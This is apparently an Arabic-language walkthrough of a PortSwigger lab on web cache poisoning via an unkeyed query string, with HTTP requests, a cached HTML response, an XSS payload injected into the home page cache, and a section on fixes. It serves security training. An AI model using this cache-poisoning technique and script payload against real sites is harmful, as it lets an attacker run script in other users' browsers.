# [Web cache poisoning via an unkeyed query string](https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query)

## **`الهدف`**
قم بتسميم الصفحة الرئيسية باستجابة تقوم بتنفيذ `alert(1)` في متصفح الضحية.
## **`خطوات الحل`**
سنقوم بتحويل طلب الدخول إلى اللاب إلى `Repeater` 
```http
GET / HTTP/2
Host: 0a5c00a704b7efca82652a0800f30098.web-security-academy.net
Cookie: session=7k8rzATfhbANJ83SWFHNzv4KWFRZO1cB
```
وسنقوم بإضافة `?cb=123` كمعلم في الـ `URL`
```http
GET /?cb=123 HTTP/2
Host: 0a5c00a704b7efca82652a0800f30098.web-security-academy.net
Cookie: session=7k8rzATfhbANJ83SWFHNzv4KWFRZO1cB
```
وسنلاحظ أنه ينعكس داخل الإستجابة
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 0
X-Cache: miss
Content-Length: 11738

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsBlog.css rel=stylesheet>
        <link rel="canonical" href='//0a5c00a704b7efca82652a0800f30098.web-security-academy.net/?cb=123'/>
        <title>Web cache poisoning via an unkeyed query string</title>
    </head>
<!--LAB_HEAD_END-->
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <!--LAB_HEADER_START-->
        <div id="academyLabHeader">
            <section class='academyLabBanner is-solved'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>Web cache poisoning via an unkeyed query string</h2>
                            <a class=link-back href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-solved'>
                            <span>LAB</span>
                            <p>Solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
            <section id=notification-labsolved class=notification-labsolved>
                <div class=container>
                    <h4>Congratulations, you solved the lab!</h4>
                    <div>
                        <span>
                            Share your skills!
                        </span>
                        <a class=button href='https://twitter.com/intent/tweet?text=I+completed+the+Web+Security+Academy+lab%3a%0aWeb+cache+poisoning+via+an+unkeyed+query+string%0a%0a@WebSecAcademy%0a&url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query&related=WebSecAcademy,Burp_Suite'>
                    <svg xmlns='http://www.w3.org/2000/svg' width=24 height=24 viewBox='0 0 20.44 17.72'>
                        <title>twitter-button</title>
                        <path d='M0,15.85c11.51,5.52,18.51-2,18.71-12.24.3-.24,1.73-1.24,1.73-1.24H18.68l1.43-2-2.74,1a4.09,4.09,0,0,0-5-.84c-3.13,1.44-2.13,4.94-2.13,4.94S6.38,6.21,1.76,1c-1.39,1.56,0,5.39.67,5.73C2.18,7,.66,6.4.66,5.9-.07,9.36,3.14,10.54,4,10.72a2.39,2.39,0,0,1-2.18.08c-.09,1.1,2.94,3.33,4.11,3.27A10.18,10.18,0,0,1,0,15.85Z'></path>
                    </svg>
                        </a>
                        <a class=button href='https://www.linkedin.com/sharing/share-offsite?url=https%3a%2f%2fportswigger.net%2fweb-security%2fweb-cache-poisoning%2fexploiting-implementation-flaws%2flab-web-cache-poisoning-unkeyed-query'>
                    <svg viewBox='0 0 64 64' width='24' xml:space='preserve' xmlns='http://www.w3.org/2000/svg'
                        <title>linkedin-button</title>
                        <path d='M2,6v52c0,2.2,1.8,4,4,4h52c2.2,0,4-1.8,4-4V6c0-2.2-1.8-4-4-4H6C3.8,2,2,3.8,2,6z M19.1,52H12V24.4h7.1V52z    M15.6,18.9c-2,0-3.6-1.5-3.6-3.4c0-1.9,1.6-3.4,3.6-3.4c2,0,3.6,1.5,3.6,3.4C19.1,17.4,17.5,18.9,15.6,18.9z M52,52h-7.1V38.2   c0-2.9-0.1-4.8-0.4-5.7c-0.3-0.9-0.8-1.5-1.4-2c-0.7-0.5-1.5-0.7-2.4-0.7c-1.2,0-2.3,0.3-3.2,1c-1,0.7-1.6,1.6-2,2.7   c-0.4,1.1-0.5,3.2-0.5,6.2V52h-8.6V24.4h7.1v4.1c2.4-3.1,5.5-4.7,9.2-4.7c1.6,0,3.1,0.3,4.5,0.9c1.3,0.6,2.4,1.3,3.1,2.2   c0.7,0.9,1.2,1.9,1.4,3.1c0.3,1.1,0.4,2.8,0.4,4.9V52z'/>
                    </svg>
                        </a>
                        <a href='https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws/lab-web-cache-poisoning-unkeyed-query'>
                            Continue learning 
                            <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                <g>
                                    <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                    <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                </g>
                            </svg>
                        </a>
                    </div>
                </div>
            </section>
        </div>
        <!--LAB_HEADER_END-->
        <div theme="blog">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <section class="blog-header">
                        <img src="/resources/images/blog.svg">
                    </section>
                    <section class="blog-list">
                        <div class="blog-post">
                        <a href="/post?postId=3"><img src="/image/blog/posts/42.jpg"></a>
                        <h2>Watching Me, Watching You.</h2>
                        <p>For all you people who work from home, there's a new app that will help you stop procrastinating and focus on your goals. The trusty webcam has been put to use as you sign up with a work buddy. You...</p>
                        <a class="button is-small" href="/post?postId=3">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=9"><img src="/image/blog/posts/67.jpg"></a>
                        <h2>The Lies People Tell</h2>
                        <p>The best kind of lies are the ones you overhear other people telling. You know they are lying because you're standing in a bar when you hear them on the phone saying, 'I'm in the grocery store.' At times like...</p>
                        <a class="button is-small" href="/post?postId=9">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=6"><img src="/image/blog/posts/25.jpg"></a>
                        <h2>Tracking Your Kids</h2>
                        <p>It's not Big Brother who's watching you, it's your folks! The first generation of datafied children is hitting the streets. What does this mean? Basically, we know where they are, where they've been and when they were last 'live' on...</p>
                        <a class="button is-small" href="/post?postId=6">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=1"><img src="/image/blog/posts/6.jpg"></a>
                        <h2>Fake News</h2>
                        <p>Is it just me that finds the way people share things on social media, without checking into them really disturbing? I've started checking things out now, not because I want to share but so I can somehow, politely, let them...</p>
                        <a class="button is-small" href="/post?postId=1">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=8"><img src="/image/blog/posts/64.jpg"></a>
                        <h2>Procrastination</h2>
                        <p>Procrastination. Putting off something or several things you really should be doing by finding endless nonsense to occupy yourself. This may be an unpopular opinion, but procrastination can be handy, it leads to some really menial tasks being done. Thinking...</p>
                        <a class="button is-small" href="/post?postId=8">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=2"><img src="/image/blog/posts/65.jpg"></a>
                        <h2>A Perfect World</h2>
                        <p>As the fight against crime is failing miserably there have been reports leaked from a Government agency that cloning is becoming a serious consideration. Experiments are being held in a secret location off the North Coast of California. A group...</p>
                        <a class="button is-small" href="/post?postId=2">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=10"><img src="/image/blog/posts/23.jpg"></a>
                        <h2>The Peopleless Circus</h2>
                        <p>When the leaflet dropped through my letterbox I thought it was a joke. The Peopleless Circus was in town. At the risk of sounding like a negative Nancy, I couldn't help thinking what is the world coming to. I'm not...</p>
                        <a class="button is-small" href="/post?postId=10">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=7"><img src="/image/blog/posts/30.jpg"></a>
                        <h2>Benefits of Travelling</h2>
                        <p>Travelling is such an emotive word. It can excite some, scare others and conjure images of grubby millennials backpacking around the far reaches of the earth for a few. It is however, a word that can mean whatever it is...</p>
                        <a class="button is-small" href="/post?postId=7">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=4"><img src="/image/blog/posts/19.jpg"></a>
                        <h2>Spider Web Security</h2>
                        <p>Today the President issued a red warning in relation to the breakdown of spider web security. So far all of the main banks and energy suppliers have been hit by this gang of thieves who are now on the run,...</p>
                        <a class="button is-small" href="/post?postId=4">View post</a>
                        </div>
                        <div class="blog-post">
                        <a href="/post?postId=5"><img src="/image/blog/posts/48.jpg"></a>
                        <h2>Look No Hands - The Game Plays Itself</h2>
                        <p>I was so fed up with my husband always sitting in front of the television playing his silly games, I did something about it. I came up with an idea that would revolutionize game playing in the future. I wrote...</p>
                        <a class="button is-small" href="/post?postId=5">View post</a>
                        </div>
                    </section>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>
```

ولكن عند تكرار إرسال الطلب مع إزالة الـ `?cb=123` سنكتشف أنه غير مفهرس وهذا يعنى أننا لا نستطيع استعماله للاختبار لأنه سيبب تلف الصفحة الرئيسية للمستخدمين ولذلك سنجرب تعديل عدة ترويسات حتى نصل إلى ترويسة تكون مفهرسة لنستطيع القيام بالإختبارات بدون أى مشاكل في الصفحة الرئيسية.

والترويسة التى نجحت هنا كانت `Otigin`
```http
GET /?cb=123 HTTP/2
Host: 0a5c00a704b7efca82652a0800f30098.web-security-academy.net
Cookie: session=7k8rzATfhbANJ83SWFHNzv4KWFRZO1cB
Origin: test.com
```
وبعد ذلك سنقوم بحقن أمر `alert` كمعلم `URL`
```http
GET /?test='/><script>alert(1)</script>` HTTP/2
Host: 0a5c00a704b7efca82652a0800f30098.web-security-academy.net
Cookie: session=7k8rzATfhbANJ83SWFHNzv4KWFRZO1cB
Origin: test.com
```
وسنجرب فتحه في المتصفح وسنجده ناجح، لذلك أخيرًا سنقوم بحذف ترويسة `Origin` لكي نؤثر على الصفحة الرئيسية ونقوم بإرسال الطلب.

وقد نحتاج لتكرار إرسال الطلب أكثر من مرة حتى يتم تجديد الـ `Cache` وبعد ذلك نعود إلى اللاب ونضغط `Home` لننتهي من حل اللاب.
## **`ترقيع الثغرة`**
يجب إعداد سيرفر ذاكرة التخزين المؤقت ليقوم بتضمين الـ `Query String` بالكامل (أو المعلمات الهامة فقط) ضمن مفتاح الكاش.

وإذا كان التطبيق لا يحتاج فعلياً إلى معلمات عشوائية فيجب إعداد الـ `WAF` أو سيرفر الـ `CDN` ليقوم بتعقيم أي `Query Parameters` غير مدرجة في القائمة البيضاء `Whitelist` قبل تمرير الطلب إلى السيرفر.

ويجب على السيرفر تطبيق آلية ترميز المخرجات `Output Encoding` لتحويل رموز `HTML` الخاصة إلى نصوص آمنة، فحتى لو تمكن المهاجم من إرسال كود `XSS` خبيث، سيتدخل المتصفح ويعرضه كنص مقروء ويمنع تنفيذ الـ `alert(1)` بفضل هذا الترميز.

ويجب على السيرفر تطبيق سياسة التحقق من المدخلات `Input Validation` بناءً على قائمة بيضاء `Whitelist` لرفض أي رموز غير متوقعة، فحتى لو حاول المهاجم التلاعب بالبيانات من جهة العميل، سيتدخل السيرفر ويرفض الطلب ويمنع إدخال أكواد `JavaScript` بفضل هذه الفلترة الصارمة.

ويجب على المطور الاعتماد على محركات قوالب `Template Engines` حديثة تدعم الترميز التلقائي `Auto-escaping`، فحتى لو نسي المطور معالجة بعض المدخلات يدوياً، سيتدخل إطار العمل `Framework` ويشفر البيانات ويمنع تفعيل وسم `script` بفضل هذه الحماية المدمجة، ولكن يجب التأكيد على أن محرك القوالب يجب أن يدعم `Context-Aware Auto-escaping`

ويجب على مسؤول النظام إعداد جدار حماية تطبيقات الويب `WAF` لفحص وتحليل جميع الطلبات الواردة، فحتى لو نسي المطورون ترقيع الثغرة برمجياً، سيتدخل الـ `WAF` ويحظر الطلب المشبوه ويمنع وصول الـ `Payload` إلى السيرفر بفضل قواعد الحماية `Rules` المحدثة.

وكطبقة حماية إضافية، يجب على السيرفر إرسال ترويسة `CSP` صارمة تمنع تنفيذ أكواد `JS` المدمجة `Inline Scripts` فحتى لو فشل السيرفر في فلترة البيانات، سيتدخل المتصفح ويمنع تنفيذ الـ `alert()` بفضل هذه السياسة.

وكخطوة أمان إضافية، بالرغم من أنها لن تمنع هذه الثغرة،يجب تفعيل خاصية `HttpOnly` لملفات تعريف الارتباط الخاصة بالجلسة `Session Cookies`، وعلى الرغم أن هذا الإجراء لن يمنع ثغرة الـ `XSS` من الحدوث، ولكنه سيمنع كود الجافاسكريبت الخبيث من الوصول إلى الجلسة عبر `document.cookie`، مما يفشل محاولات اختراق الحساب `Account Takeover`.
